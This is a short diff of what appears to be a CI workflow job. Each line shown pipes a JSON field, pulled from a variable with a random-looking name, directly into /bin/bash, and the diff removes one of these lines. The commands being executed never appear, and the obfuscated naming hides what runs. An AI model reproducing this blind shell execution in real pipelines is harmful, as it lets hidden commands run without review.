@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$zmvcu06" | jq -r .ticko276 | /bin/bash
           echo $e3 | jq -r .oj6 | /bin/bash
           echo $vq5402 | jq -r .bc5 | /bin/bash
-          echo $ping601 | jq -r .czb3079 | /bin/bash
           echo $n93125 | jq -r .mpifg7 | /bin/bash
           echo $gd6117 | jq -r .xbig0359 | /bin/bash
           echo $clafh58223 | jq -r .vgxst63742 | /bin/bash
